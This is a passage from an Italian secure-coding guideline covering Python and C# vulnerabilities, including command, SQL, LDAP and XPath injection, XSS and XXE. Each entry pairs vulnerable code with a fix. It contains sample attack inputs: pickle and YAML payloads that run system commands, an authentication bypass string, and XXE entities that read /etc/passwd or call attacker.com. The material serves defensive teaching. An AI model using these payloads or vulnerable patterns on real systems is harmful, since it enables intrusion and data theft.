che consente l'accesso al file system e alla sua ma nipolazione arbitraria. Nel caso in cui un aggresso re fosse 
in grado di fornire un input specifico per il modul o OS, potrebbero verificarsi situazioni di violazio ne di 
accesso o di corruzione dei dati, laddove non fosse ro messi in atto i dovuti controlli. 
Come difendersi 
 
 
Linee guida per lo sviluppo sicuro Pag. 95  a 156  
 
• Trust boundaries. Non utilizzare il modulo OS per l a manipolazione di file host ricevuti da una fonte 
non attendibile o controllata dall'utente.  
• Comunicazione protetta. Assicurarsi che venga utili zzata una connessione di rete crittografata. 
• Validazione. Il path di un file che si vuole manipo lare dev’essere validato in modo corretto: evitare 
che possa essere inserito da un utente in modo dina mico. Assicurarsi, inoltre, che rispecchi 
completamente delle regole canoniche. 
• Sandbox. Limitare l'accesso al percorso dei file al l'interno di una directory specifica. 
• White list. Creare una white list di file o directo ry che possono essere manipolati in modo sicuro e 
consentire l'accesso solo a questi file o directory . 
 
Esempio:  
Forma non corretta: l'applicazione riceve un file p ath dall'utente e rimuove il file stesso: 
import os 
import sys 
[…] 
path = sys.stdin.readline()[:- 1] 
os.remove(path) 
Forma corretta: l'applicazione restringe l'accesso ad un file ad una specifica directory: 
import os 
import sys 
def  is_safe_path (basedir, path): 
return  os.path.abspath(path).startswith(basedir) 
path = sys.stdin.readline()[:- 1] 
if  not  is_safe_path( '/tmp/userfiles' , path): 
sys.stdout.write( 'Not allowed!\n' ) 
sys.exit() 
os.remove(path) 
7.5.11  Unsecure deserialization 
Come riconoscerla 
La “unsecure deserialization” è una vulnerabilità c he si verifica quando un’applicazione utilizza il p rocesso 
di deserializzazione di dati serializzati non atten dibili. Tra la serializzazione da parte del process o originario 
e la deserializzazione da parte del processo di des tinazione, i dati serializzati possono aver subito 
inserimenti di codice dannoso. 
In seguito a deserializzazione di dati inquinati co n porzioni di codice malevolo, l’attaccante può inf liggere un 
attacco di denial of service (DoS) o eseguire codic e arbitrario.  
Come difendersi 
• Evitare di utilizzare le tecniche di serializzazion e/deserializzazione. Se è strettamente necessario 
utilizzarle, verificare che il dato serializzato no n possa essere inquinato e manomesso durante il suo  
percorso. Ad esempio, garantire la trasmissione att raverso una connessione sicura e criptata. 
• Eliminare, se possibile, dal codice sorgente le seg uenti API vulnerabili: 
o Pickle 
  Esempio: 
  import pickle 
  data = """ cos.system(S'dir')tR. """ 
  pickle.loads(data) 
o PyYAML 
  Esempio: 
import yaml 
document = "!!python/object/apply:os.system ['ipcon fig']" 
print(yaml.load(document)) 
o Jsonpickle  
o Metodi encode e store 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 96  a 156  
 
7.6  C# 
C# è un linguaggio di programmazione orientato agli  oggetti sviluppato da Microsoft all’interno 
dell’iniziativa .NET, e successivamente approvato c ome standard della Ecma (ECMA-334) e ISO (norma 
ISO/IEC 23270). La sintassi e la struttura del C# p rendono spunto da vari linguaggi nati precedentemen te, in 
particolare Delphi, C++ e Java. Il risultato è un l inguaggio con meno simbolismo rispetto a C++, meno 
elelementi decorativi rispetto a Java, ma comunque orientato agli oggetti in modo nativo e adatto allo  
sviluppo di una vasta gamma di soluzioni software.  
Vengono di seguito analizzate le principali vulnera bilità e relative contromisure da adottare. 
7.6.1  Cross-site scripting (XSS) 
Come riconoscerla 
Il Cross Site Scripting consiste nella possibilità che un attaccante possa inserire nella pagina 
dell’applicazione, quindi nel codice HTML, script c he, una volta eseguiti, possano trarre in inganno i  legittimi 
utenti, trafugare informazioni e predisporre nuovi attacchi.  
Questa minaccia, enormemente diffusa, è dovuta allo  scarso controllo dell’input da parte delle web 
application.  
Il Cross Site Scripting può essere reflected o stor ed. Nel primo caso, uno script inoculato è valido s olo 
all’interno della sessione corrente, ma i suoi effe tti possono essere molto dannosi per il sito vittim a 
dell’attacco. 
Ancora più grave è il Cross Site Scripting di tipo stored. In questo caso lo script inoculato viene me morizzato 
come parte intregrante della pagina all’interno di un database e rispristinato ogni qual volta la pagi na in 
questione viene caricata. Quest’attacco è stato sfr uttato ampiamente nel recente passato, soprattutto 
laddove veniva consentito agli utenti di inserire r ecensioni, commenti e altri contributi. 
 
Volendo schematizzare, possiamo categorizzare gli a ttacchi XSS nelle seguenti tipologie: 
• Reflected XSS, in cui la stringa dannosa proviene d alla richiesta dell’utente. 
• Stored XSS, in cui la stringa dannosa proviene dal database del sito Web. 
 
Esiste anche un Cross Site Scripting dovuto a una l acuna nella codifica UTF-7, che permettere di masch erare 
i caratteri “<” e “>”, facendoli sfuggire al contro llo. Questa minaccia non è più possibile nei modern i 
browser, ad eccezione di Microsoft Internet Explore r 11.  
 
Come difendersi 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white 
list, scartando quelli che non la rispettano. Occor re controllare il tipo del dato, la sua dimensione,  
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• Codificare completamente tutti i dati dinamici prim a di incorporarli. La codifica dovrebbe essere 
sensibile al contesto, in base al tipo di dato che si vuole neutralizzare: se ci si aspetta che possa 
esserci codice HTML abusivo, occorre codificare gli  eventuali tag HTML, se ci si potrebbe trovare di 
fronte a uno script, allora bisogna codificare gli elementi sintattici di Javascript, ecc. 
• Si consiglia, a tal proposito, di utilizzare la lib reria di codifica ESAPI. 
• Nell'intestazione di risposta Content-Type HTTP, è necessario definire esplicitamente la codifica dei 
caratteri (charset) per l'intera pagina. 
• Impostare l’attributo HTTPOnly per proteggere il co okie della sessione da indebite letture da parte 
di script malevoli. 
 
Esempi: 
 
 
Linee guida per lo sviluppo sicuro Pag. 97  a 156  
 
La libreria HtmlSanitizer permette di depurare una stringa in input da costrutti sintattici alla base di un 
attacco XSS. Di seguito una funzione che utilizza t ale libreria: 
 
  public static string SanitizeHtml(string html, pa rams string[] blackList) 
  { 
     var sanitizer = new HtmlSanitizer(); 
     if (blackList != null && blackList.Length > 0)  
     { 
       sanitizer.BlackList.Clear(); 
       foreach (string item in blackList) 
        sanitizer.BlackList.Add(item); 
     } 
     return sanitizer.Sanitize(html); 
  } 
Qui viene mostrato del codice C# vulnerabile alla X SS reflected: 
string nome = Request.QueryString["nome"]; 
Response.Write("Ciao " + nome); // non sicuro 
Di seguito lo stesso codice, messo in sicurezza: 
string nome = Request.QueryString["nome"]; 
nome = System.Web.Security.AntiXss.AntiXssEncoder.H tmlEncode(nome, true); 
Response.Write("Ciao " + nome); 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/79.html , 
CWE-79: Improper Neutralization of Input During Web  Page Generation ('Cross-site Scripting'). 
 
7.6.2  Code Injection 
Come riconoscerla 
L'applicazione esegue del codice ricevuto attravers o l’input che non è stato sufficientemente verifica to. Un 
utente in grado di inserire codice arbitrario può p rendere il controllo dell’applicazione e del server , se non 
sono state adottate tecniche di difesa in profondit à. 
Esempio: 
Il codice seguente mostra come del codice C# può es sere passibile di code injection: 
String codiceUtente = request.Form["Codice"]; 
  
CSharpCodeProvider compiler = new CSharpCodeProvide r(); 
CompilerParameters parametri = new CompilerParamete rs();  
parametri.GenerateInMemory = true; 
parametri.GenerateExecutable = true; 
 
try  
{ 
 CompilerResults risultati  = compiler.CompileAssemblyFromSource(parametri, co diceUtente); 
   
 Assembly compilato = risultati .CompiledAssembly;  
 exitCode = ( int )compilato.EntryPoint.Invoke( null , new  object [0]); 
 […] 
Come difendersi. 
• È vietata qualsiasi esecuzione dinamica di codice r icevuto da canali non attendibili. Se è prorpio 
necessario compilare ed eseguire dinamicamente del codice dinamico, occorre allore predisporre 
una sandbox isolata, ad esempio AppDomain di .NET o  un thread isolato.  
• Devono essere effettuati tutti i controlli possibil i per validare il codice in ingresso. 
• Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di 
privilegi non necessari. 
• Se è possibile optare per isolare tutta l'esecuzion e dinamica utilizzando un account utente separato 
e dedicato che abbia privilegi solo per le operazio ni e i file specifici utilizzati dal codice da eseg uire, 
in base al principio denominato "Principle of Least  Privilege". Il principio stabilisce che agli utent i 
 
 
Linee guida per lo sviluppo sicuro Pag. 98  a 156  
 
venga attribuito il più basso livello di “diritti” che possano, detenere rimanendo comunque in grado 
di compiere il proprio lavoro. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/94.html  Improper Control of 
Generation of Code ('Code Injection') CWE-94 
7.6.3  Command Injection 
Come riconscerla 
Sfruttando questa vulnerabilità un aggressore potre bbe eseguire comandi di sistema arbitrari 
sull’application server. Il danno che potrebbe esse re arrecato comprende: 
• la possibilità di modificare i permessi all’interno  di file o directory nel file system (read / create  / 
modify / delete); 
• la possibilità di instaurare connessioni di rete no n autorizzate verso il server;  
• la possibilità di gestire i servizi di sistema, avv iandoli, fermandoli o rimuovendoli; 
• la completa acquisizione del controllo del server d a parte dell'attaccante. 
 
Attraverso questa vulnerabilità l'applicazione vien e portata ad eseguire i comandi dell’attaccante. 
L'operazione spesso viene effettuata utilizzando st ringhe di input controllate dall'utente, sulle qual i non 
viene effettuata alcuna verifica. 
Potrebbero così essere eseguiti direttamente sul se rver comandi anche molto pericolosi per il sistema o per 
la sicurezza dei dati. 
 
Come difendersi 
• Rimodulare il codice per evitare una qualsiasi esec uzione diretta di script di comandi. Per effettuare  
operazioni di sistema, utilizzare eventualmente API  fornite dalla piattaforma. 
• Se non è possibile fare a meno di lanciare shell de i comandi, assicurarsi tuttavia di eseguire solo 
stringhe statiche, che non includano l'input dell'u tente. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La convalida dovrebbe essere 
basata su una white list: dovrebbero essere accetta ti solo i dati che adattano a una struttura 
specificata, e scartati i dati che non rientrano in  questa categoria. I parametri devono essere limita ti 
a un set di caratteri consentito e i caratteri rico nosciuti come estranei devono essere filtrati e 
neutralizzati (escaping). Oltre ai caratteri, occor re controllare il tipo del dato, la sua dimensione,  
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di 
privilegi non necessari. 
• L’esecuzione del codice dovrebbe utilizzare un acco unt utente separato e dedicato, fornito dei soli 
privilegi strettamente necessari, in base al princi pio denominato "Principle of Least Privilege". Il 
principio stabilisce che agli utenti venga attribui to il più basso livello di “diritti” che possano 
detenere rimanendo comunque in grado di compiere il  proprio lavoro. 
 
Esempio: 
Il seguente codice è vulnerabile, poiché se al para metro “comando” viene passato il valore "/ sbin / 
shutdown" e il server Web è in esecuzione come root , la macchina che esegue il server Web verrà arrest ata 
e non sarà disponibile per richieste future: 
public IActionResult Run(string nomeFile) 
{ 
  Process p = new Process(); 
  p.StartInfo.FileName = nomeFile; // Non sicuro 
  p.StartInfo.RedirectStandardOutput = true; 
  p.Start(); 
  string output = p.StandardOutput.ReadToEnd(); 
 
 
Linee guida per lo sviluppo sicuro Pag. 99  a 156  
 
  return Content(output); 
} 
La versione sicura del codice prevede un controllo che filtri le richieste: 
 public IActionResult Run(string nomeFile) 
 { 
  // Se il valore passato è nullo o contiene caratt eri  
  // diversi dalle lettere minuscole o maiuscole 
  // respinge la richiesta 
  if (nomeFile == null || !Regex.IsMatch(nomeFile, "^[a-zA-Z]+$")) 
  { 
   return BadRequest(); 
  } 
 
  Process p = new Process(); 
  p.StartInfo.FileName = nomeFile; // adesso è sicu ro 
  p.StartInfo.RedirectStandardOutput = true; 
  p.Start(); 
  string output = p.StandardOutput.ReadToEnd(); 
  return Content(output); 
 } 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/77.html  CWE-77: Improper 
Neutralization of Special Elements used in a Comman d ('Command Injection') 
7.6.4  Connection String Injection 
Come riconoscerla 
Questo tipo di attacchi è possibile nel momento in cui l’applicazione affida all’input utente la compo siszione 
dinamica della stringa di connessione al database o ppure al server. 
Un utente malintenzionato potrebbe manipolare la st ringa di connessione dell'applicazione al database 
oppure al server. Utilizzando strumenti e modifiche  di testo semplici, l'aggressore potrebbe essere in  grado 
di eseguire una delle seguenti operazioni: 
• Danneggiare le performance delle applicazioni (ad e sempio incrementando il valore relativo al MIN 
POOL SIZE); 
• Manomettere la gestione delle connessioni di rete ( ad esempio, tramite TRUSTED CONNECTION); 
• Dirigere l'applicazione sul database fraudolento an ziché a quello genuino; 
• Scoprire la password dell'account di sistema nel da tabase (tramite un brute-force attack). 
 
Per comunicare con il proprio database o con un alt ro server (ad esempio Active Directory), l'applicaz ione 
costruisce dinamicamente una sua stringa di conness ione. Questa stringa di connessione viene costruita  
dinamicamente con l’input inserito dall’utente. Se i valori immessi sono stati verificati in misura 
insufficiente o non sono stati affatto verificati, la stringa di connessione potrebbe essere manipolat a ad arte 
a vantaggio dell’attaccante. 
Come difendersi 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white 
list, scartando quelli che non la rispettano). In g enerale, è necessario controllare il tipo del dato,  la 
sua dimensione, l'intervallo di validità (range), i l formato ed eventuali valori attesi (white list). 
• Evitare di costruire dinamicamente stringhe di conn essione. Se è necessario creare dinamicamente 
una stringa di connessione evitare di includere l'i nput dell'utente. In ogni caso, utilizzare utilità 
basate sulla piattaforma, come SqlConnectionStringB uilder di .NET, o almeno codificare l'input 
validato come il piu' idoneo per la piattaforma uti lizzata. 
• Le stringhe di connessione possono essere custodite  nel file web.config. Si tratta di una scelta 
migliore rispetto a comporle a runtime con l’input dell’utente. Si separa così l’applicazione dai 
metadati. Il file di configurazione in questione de ve essere messo in sicurezza attivano la modalità 
 
 
Linee guida per lo sviluppo sicuro Pag. 100  a 156  
 
“protected configuration”, che permette di memorizz are le stringhe di connessione in forma 
crittografata (encrypted). 
 
Esempi: 
Metodo dove sono presentati l’approccio vulnerabile  e quello sicuro: 
 
  public void ProcessRequest(HttpContext contesto) 
  { 
    string nomeUtente = contesto.Request.QueryStrin g["nomeUtente"]; 
 
    // Vulnerabile: Uso diretto dell'input dell'ute nte in una stringa di  
    // connessione passata a SqlConnection 
    string connectionString = "server=(local);user id=" + nomeUtente +    
    ";password= pass;"; 
    SqlConnection sqlConnectionBad = new SqlConnect ion(connectionString); 
 
    // Sicuro: Uso di SqlConnectionStringBuilder pe r includere in modo sicuro  
    // l'input dell'utente in una stringa di connes sione 
    SqlConnectionStringBuilder builder = new SqlCon nectionStringBuilder(); 
    builder["Data Source"] = "(local)"; 
    builder["integrated Security"] = true; 
    builder["user id"] = nomeUtente; 
    SqlConnection sqlConnectionGood = new  
     SqlConnection(builder.ConnectionString); 
  } 
 
Nell’esempio che segue viene evidenziata la sezione  che custodisce la stringa di connessione in modali tà 
encrypt nel file di configurazione web.config: 
 
  <connectionStrings configProtectionProvider="RsaP rotectedConfigurationProvider"> 
  <EncryptedData Type="http://www.w3.org/2001/04/xm lenc#Element" 
   xmlns="http://www.w3.org/2001/04/xmlenc#"> 
   <EncryptionMethod Algorithm="http://www.w3.org/2 001/04/xmlenc#tripledes-cbc" /> 
   <KeyInfo xmlns="http://www.w3.org/2000/09/xmldsi g#"> 
    <EncryptedKey xmlns="http://www.w3.org/2001/04/ xmlenc#"> 
     <EncryptionMethod Algorithm="http://www.w3.org /2001/04/xmlenc#rsa-1_5" /> 
     <KeyInfo xmlns="http://www.w3.org/2000/09/xmld sig#"> 
      <KeyName>RSA Key</KeyName> 
     </KeyInfo> 
     <CipherData> 
      
<CipherValue>RXO/zmmy3sR0iOJoF4ooxkFxwelVYpT0riwP2m YpR3FU+r6BPfvsqb384pohivkyNY7Dm 
4lPgR2bE9F7k6TblLVJFvnQu7p7d/yjnhzgHwWKMqb0M0t0Y8DO wogkDDXFxs1UxIhtknc+2a7UGtGh6Di 
3N572qxdfmGfQc7ZbwNE= 
      </CipherValue> 
     </CipherData> 
    </EncryptedKey> 
   </KeyInfo> 
   <CipherData> 
    
<CipherValue>KMNKBuV9nOid8pUvdNLY5I8R7BaEGncjkwYgsh W8ClKjrXSM7zeIRmAy/cTaniu8Rfk92 
KVkEK83+UlQd+GQ6pycO3eM8DTM5kCyLcEiJa5XUAQv4KITBNBN 6fBXsWrGuEyUDWZYm6Eijl8DqRDb11i 
+StkBLlHPyyhbnCAsXdz5CaqVuG0obEy2xmnGQ6G3Mzr74j4ifx nyvRq7levA2sBR4lhE5M80Cd5yKEJkt 
cPWZYM99TmyO3KYjtmRW/Ws/XO3z9z1b1KohE5Ok/YX1YV0+Uk4 /yuZo0Bjk+rErG505YMfRVtxSJ4ee41 
8ZMfp4vOaqzKrSkHPie3zIR7SuVUeYPFZbcV65BKCUlT4EtPLgi 8CHu8bMBQkdWxOnQEIBeY+TerAee/Si 
BCrA8M/n9bpLlRJkUb+URiGLoaj+XHym//fmCclAcveKlba6vKr cbqhEjsnY2F522yaTHcc1+wXUWqif7r 
SIPhc0+MT1hB1SZjd8dmPgtZUyzcL51DoChy+hZ4vLzE= 
    </CipherValue> 
   </CipherData> 
  </EncryptedData> 
 </connectionStrings> 
 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html , 
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
 
 
Linee guida per lo sviluppo sicuro Pag. 101  a 156  
 
7.6.5  LDAP Injection 
Come riconoscerla 
La LDAP Injection è un tipo di attacco cui sono vul nerabili le applicazioni e che utilizzano l’input, senza 
verificarlo adeguatamente, per costruire query LDAP  (Lightweight Directory Access Protocol). 
Se coronato da successo, l’LDAP injection potrebbe consentire un furto di informazioni, un’elevazione dei 
privilegi e l’autenticazione con un’identità altrui  (spoofing). 
Per comunicare con la directory delle utenze (ad es empio Active Directory), l'applicazione costruisce 
dinamicamente delle query. Se utilizza l’input uten te senza verificarlo, un malintenzionato può inseri re 
comandi modificati ad arte per carpire informazioni  non dovute. 
Come difendersi 
Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consisglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white list, 
scartando quelli che non la rispettano). Occorre co ntrollare il tipo del dato, la sua dimensione, l'in tervallo di 
validità (range), il formato ed eventuali valori at tesi (white list). 
 
Esempio: 
Il seguente codice, avvalendosi di una variabile (n omeutente) pervenuta attraverso l’input, è passbile  di 
LDAP injection, a meno che la stringa non sia sotto posta a codifica (encoding) e validazione. 
 
DirectorySearcher search = new DirectorySearcher(de ); 
search.Filter = "(ACName=" + nomeutente + ")"; 
search.SearchScope = SearchScope.Subtree; 
search.CacheResults = false; 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/90.html,  
CWE-90: Improper Neutralization of Special Elements  used in an LDAP Query ('LDAP Injection') 
7.6.6  Resource Injection 
Come riconoscerla  
Quando un'applicazione definisce un tipo di risorsa  o posizione in base all'input dell'utente, come un  nome 
file o un numero di porta, questi dati possono esse re manipolati per eseguire o accedere a risorse div erse. 
L’attacco di “path traversal” è un caso particolare  della resource injection. In tal caso a essere ini ettato è un 
path manipolativo che punta a risorse diverse nel f ile system. 
Se si utilizza l’input dell’utente per definire la porta sulla quale aprire un socket, si da all’utent e la possibilità 
di introdurre una backdoor attraverso la quale potr ebbe prendere il controllo del sistema. 
Come difendersi 
In molti casi non è necessario aprire un socket man ualmente; meglio affidarsi a librerie e protocolli 
esistenti. 
• Tutti i dati inviati devono essere crittografati, s e sono sensibili. Nel dubbio se i dati siano sensib ili o 
possano diventarlo, meglio comunque crittografarli.  
• Qualsiasi input letto dal socket deve essere valida to. 
• Le applicazioni non  dovrebbero utilizzare l’input dell’utente per accedere a risorse del sistema. Nel  
caso si scelga di farlo, è obbligatorio validare l’ input, per esempio attraverso una white list. Se si  
consente la creazione di socket, controllare scrupo losamente questo tipo di attività. 
 
Esempio: 
Creazione di un socket passibile di resource inject ion, qualora i parametri fossero controllati dall’u tente: 
  public static void Run() 
  { 
    Socket socket = new Socket(AddressFamily.InterN etwork, SocketType.Stream,  
 
 
Linee guida per lo sviluppo sicuro Pag. 102  a 156  
 
    ProtocolType.Tcp); 
 
    TcpClient client = new TcpClient("example.com",  80);  
    UdpClient listener = new UdpClient(80);  
  } 
 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html, 
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.6.7   SQL Injection 
Come riconoscerla  
I dati forniti dall'utente, in un modulo (form) o a ttraverso i parametri URL, devono essere sempre 
considerati non attendibili e potenzialmente corrot ti. La composizione dinamica di query SQL, a partir e da 
dati non verificati, consente agli aggressori di in serire valori appositamente predisposti per modific arne il 
contenuto e il significato. Gli attacchi di SQL inj ection possono leggere, modificare o eliminare info rmazioni 
riservate dal database e talvolta persino metterlo fuori uso o eseguire comandi arbitrari di sistema 
operativo. 
Come difendersi 
• In genere, la soluzione consiste nel fare affidamen to su query parametriche, piuttosto che sulla 
concatenazione di stringhe. Questa tecnica fornisce  un valido escaping dei caratteri pericolosi. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere 
basata su una white list: dovrebbero essere accetta ti solo i dati che adattano a una struttura 
specificata, scartando quelli che non rispettano la  white list. Occorre controllare il tipo del dato, la 
sua dimensione, l'intervallo di validità (range), i l formato ed eventuali valori attesi (white list). 
• Limitare l'accesso agli oggetti e alle funzionalità  di database, in base al "Principle of Least Privil ege" 
(non fornire agli utenti permessi più elevati di qu elli strettamente necessari per svolgere il loro 
lavoro). 
 
Esempio: 
Codice vulnerabile:  
 public IActionResult Autenticazione(string nomeUte nte) 
 { 
   // Non sicuro. Un utente malintenzionato può agg irare l'autenticazione passando  
   // nomeUtente con il valore "' or 1=1 or ''='"; 
var query = "SELECT * FROM Utenti WHERE Nome = '" +  nomeUtente + "'";    
var nomeUtenteExists = _context.nomeUtentes.FromSql (query).Any(); 
 
    return Content(nomeUtenteExists ? "success" : " fail"); 
 } 
Codice sicuro: 
 public IActionResult Autenticazione(string nomeUte nte) 
 { 
var query = "SELECT * FROM Utenti WHERE Username = {0}"; // Safe 
var userExists = _context.Users.FromSql(query, nome Utente).Any(); 
return Content(userExists ? "success" : "fail"); 
 } 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/89.html , 
CWE-89: Improper Neutralization of Special Elements  used in an SQL Command ('SQL Injection'). 
7.6.8  XPath Injection 
Come riconoscerla  
 
 
Linee guida per lo sviluppo sicuro Pag. 103  a 156  
 
Gli attacchi XPath Injection sono possibili quando un sito Web utilizza le informazioni fornite dall'u tente per 
costruire una query XPath per i dati XML. Inviando informazioni intenzionalmente malformate nel sito W eb, 
un utente malintenzionato può scoprire come sono st rutturati i dati XML o accedere a dati a cui 
normalmente non avrebbe accesso. Potrebbe persino e ssere in grado di elevare i suoi privilegi sul sito  Web 
se i dati XML vengono utilizzati per l'autenticazio ne (come un file utente basato su XML).  
Come difendersi 
• Evitare che la costruzione della query XPath dipend a dalle informazioni inserite dall'utente. 
Possibilmente mapparla con i parametri utente mante nendo la separazione tra dati e codice. Nel 
caso fosse necessario includere l'input dell’utente  nella query, questo dovrà essere 
precedentemente validato. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere 
basata su una white list (si dovrebbero accettare s olo i dati che adattano a una struttura 
specificata, scartando quelli che non la rispettano ). Occorre controllare il tipo del dato, la sua 
dimensione, l'intervallo di validità (range), il fo rmato ed eventuali valori attesi (white list). 
 
Esempio: 
Codice vulnerabile  
public IActionResult Autenticazione(string nomeuten te, string password) 
{ 
    // Non sicuro. Un attaccante può aggirare  
   // l'autenticazione modificando il valore di nom eutente con "' or 1=1 or ''='" 
    String espressione = "/utenti/nomeutente[@nome= '" + nomeutente +  
     "' and @password='" + password + "']";  
  
    return Content(doc.SelectSingleNode(espressione ) !=  
            null ? "success" : "fail"); 
 } 
 
 Codice sicuro 
 public IActionResult Autenticazione(string nomeute nte, string password) 
 { 
  // Limita nome utente e passwordword alle sole le ttere alfabetiche 
  if (!Regex.IsMatch(nomeutente, "^[a-zA-Z]+$") ||  
    !Regex.IsMatch(password, "^[a-zA-Z]+$")) 
  { 
    return BadRequest(); 
  } 
 
  String espressione = "/utenti/nomeutente[@nome='"  + nomeutente +  
             "' and @password='" + password + "']";   
  return Content(doc.SelectSingleNode(espressione) != null ? "success" : "fail"); 
 } 
 
Per ulteriori informazioni si veda: http://cwe.mitr e.org/data/definitions/643.html, 
CWE-643: Improper Neutralization of Data within XPa th Expressions ('XPath Injection'). 
7.6.9  XML External Entity (XXE) injection 
Come riconoscerla  
Se l’applicazione web riceve in input un documento XML che consente l‘elaborazione di entità esterne, 
dichiarate nel DTD, il sistema potrebbe essere espo sto a possibili attacchi di tipo XXE. Se viene effe ttuato il 
parsing di entità create ad arte, come nell’esempio  seguente, potrebbero essere visualizzate dall’atta ccante 
le password di sistema oppure eseguito del codice m alevolo. 
Esempio: 
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&x xe;</foo> 
<!ENTITY xxe SYSTEM "http://www.attacker.com/text.t xt" >]><foo>&xxe;</foo> 
 
 
Linee guida per lo sviluppo sicuro Pag. 104  a 156  
 
Come difendersi 
• Bisogna evitare di incorporare entità esterne. 
• Occorre assicurarsi di disabilitare il parser dal c aricamento automatico di entità esterne. 
• Formati di dati meno complessi, come JSON, possono rendere più difficile la serializzazione di dati 
sensibili. 
• Devono essere apportati i necessari aggiornamenti a  tutti i parser e alle librerie XML in uso da parte  
dell'applicazione o sul sistema operativo sottostan te.  
• Se viene utilizzato SOAP, occorre aggiornarlo alla versione 1.2 o successive. 
• Implementare la convalida dell’input come evidenzia to in altri punti. 
• Verificare che la funzionalità di caricamento di fi le XML o XSL convalidI l'XML in entrata utilizzando  
uno schema XSD. 
Esempio : 
Formato non corretto - Il parsing del documento XML , qui racchiuso nella stringa OurOutputXMLString, 
carica qualunque entità esterna, se non validata. 
XmlDocument xmlDoc = new XmlDocument(); 
xmlDoc.LoadXml(OurOutputXMLString); 
Formato corretto - La riga evidenziata imposta a nu ll il valore del resolver. In questo modo s’impedir à al 
parser di prendere in considerazione le entità este rne. 
XmlDocument xmlDoc = new XmlDocument(); 
xmlDoc.XmlResolver = null; 
xmlDoc.LoadXml(OurOutputXMLString); 
Per una regolazione più sottile, basterà utilizzare  una classe derivata da XmlUrlResolver. Si potrà de cidere 
quali domini potranno essere accettati dfile XML.  
7.6.10  Ulteriori indicazioni per lo sviluppo sicuro 
Di seguito ulteriori suggerimenti per lo sviluppo s icuro in C#. 
7.6.10.1  Managed Wrapper per l'implementazione del codice na tivo 
Spesso sorge la necessità di rendere disponibile un a funzionalità utile in codice nativo per il codice  gestito. 
La realizzazione dei managed wrapper può essere sem plificata usando platform invoke o COM interop. Per  
la riuscita di quest’operazione è tuttavia necessar io che i chiamanti dei wrapper dispongano di diritt i per il 
codice non gestito (unmanaged code).  
Invece di concedere diritti per il codice non gesti to a tutte le applicazioni che usano il wrapper, è preferibile 
fornire questi diritti solo al codice wrapper. Se l a funzionalità sottostante non espone alcuna risors a e 
l'implementazione è verosimilmente sicura, chiunque  potrà chiamare il wrapper con i regolari diritti 
sull’unmanaged code. Quando invece, la funzionalità  nativa espone delle risorse, il wrapper può metter e i 
suoi chiamanti in pericolo, per cui è necessaria, d a parte sua, un’attenta verifica della sicurezza de l codice 
nativo. 
7.6.10.2   Library Code che espone risorse protette 
La libreria funge da interfaccia per l’accesso a de terminate risorse che non sono altrimenti disponibi li; deve 
quindi richiedere autorizzazioni per l’accesso alle  risorse che utilizzano. In generale, laddove si es pone una 
risorsa (qualunque essa sia), il codice deve implem entare una richiesta di autorizzazione appropriata alla 
risorsa (cioè deve eseguire un controllo di protezi one).  
7.6.10.3  Richieste di autorizzazione 
La richiesta di autorizzazioni è il modo in cui si consente al Common Runtime Language (CLR) di .NET d i 
sapere cosa deve fare il codice per eseguire il pro prio lavoro. Sebbene la richiesta di autorizzazioni  sia 
facoltativa e non sia necessaria per la compilazion e del codice, ci sono importanti motivi per richied ere le 
 
 
Linee guida per lo sviluppo sicuro Pag. 105  a 156  
 
appropriate autorizzazioni all'interno del codice. Quando il codice richiede autorizzazioni utilizzand o il 
metodo Demand, CLR verifica che tutti i moduli che chiamano il codice in questione dispongano delle 
autorizzazioni appropriate. Senza queste autorizzaz ioni, la richiesta non riesce. La verifica delle 
autorizzazioni viene determinata eseguendo uno stac k-walk. È importante dal punto di vista dell'usabil ità e 
della sicurezza che il codice riceva le autorizzazi oni minime necessarie per l'esecuzione. 
Nell'esempio di codice riportato di seguito viene i llustrata una richiesta di autorizzazione di base: 
 
[assembly :FileIOPermissionAttribute(SecurityAction.RequestMi nimum,Write= "C:\\test.tmp" )] 
[assembly :PermissionSet(SecurityAction.RequestOptional,Unres tricted=false)] 
 
Questo esempio indica al sistema di protezione del Framework .NET che il codice non dovrebbe essere 
eseguito a meno che, non riceva l'autorizzazione a scrivere a C: \ test.tmp. Se il codice incontra sem pre 
criteri di protezione che non concedono quest’autor izzazione, viene generata una PolicyException e il 
codice non viene eseguito. Utilizzando questa richi esta, si può essere certi che il codice verrà esegu ito solo 
se verrà concessa tale autorizzazione. 
Questo esempio indica anche al sistema che non è ri chiesta alcuna autorizzazione aggiuntiva. Le 
autorizzazioni di esecuzione non necessarie al codi ce possono portare a problemi di sicurezza. 
Un altro modo per limitare le autorizzazioni che il  codice riceve, in base al criterio dei minimi priv ilegi, è 
quello di elencare le autorizzazioni specifiche che  si desidera rifiutare.  
7.6.10.4  Protezione dell'accesso ai metodi 
.NET Framework fornisce un meccanismo denominato Co de Access Security (CAS), che consente di 
applicare vari livelli di attendibilità a codice di verso in esecuzione nella stessa applicazione. 
Alcuni metodi potrebbero non essere adatti per cons entire le chiamate da parte di codice arbitrario no n 
attendibile. Potrebbero, infatti, fornire informazi oni limitate; potrebbero non eseguire il controllo degli 
